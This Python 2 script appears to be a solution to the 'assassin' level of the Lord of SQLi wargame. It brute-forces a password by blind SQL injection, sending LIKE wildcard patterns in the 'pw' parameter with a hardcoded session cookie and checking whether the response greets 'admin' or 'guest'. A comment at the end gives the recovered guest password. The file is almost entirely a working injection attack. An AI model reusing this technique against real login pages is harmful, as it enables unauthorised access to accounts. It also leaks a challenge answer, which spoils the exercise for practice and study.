#!/usr/bin/env python

import urllib
import urllib2
import sys

URL = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=o4js9lcvfjuu3tts6juitjlido"


def query(Q, target):
    UURL = URL + "?pw=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)
    text = res.read()
    if "location.href" in text:
        print "Session expired..."
        sys.exit()

    return "<h2>Hello {}</h2>".format(target) in text

password = ""
guess_table = '!@#$^&*()-=+[]{},.<>/?;:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
# guess_table = [chr(i) for i in range(32, 127)]

def guess(pattern, target):
    print "guessing ... {}".format(pattern)
    return query("{}".format(pattern), target)


while len(password) < 8:
    found = False
    for ch in guess_table:
        if guess(password + ch + "%", "admin"):
            password += ch
            print password
            found = True
            break
    if found is True:
        continue
    for ch in guess_table:
        if guess(password + ch + "%", "guest"):
            password += ch
            print password
            break

print password
# guest password = 90d2fe10